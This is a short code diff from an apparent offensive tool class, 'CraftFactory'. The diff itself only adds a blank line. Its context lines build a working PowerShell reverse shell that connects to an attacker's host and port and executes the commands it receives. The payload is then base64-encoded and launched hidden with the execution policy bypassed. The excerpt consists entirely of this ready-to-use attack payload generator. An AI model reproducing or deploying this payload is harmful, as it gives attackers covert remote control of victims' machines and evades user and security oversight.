@@ -55,6 +55,7 @@ class CraftFactory:
         raw_cmd = f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendchoice  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendchoice);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
 
         import base64
+
         encoded_cmd = base64.b64encode(raw_cmd.encode('utf-16le')).decode()
 
         final_payload = f"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {encoded_cmd}"
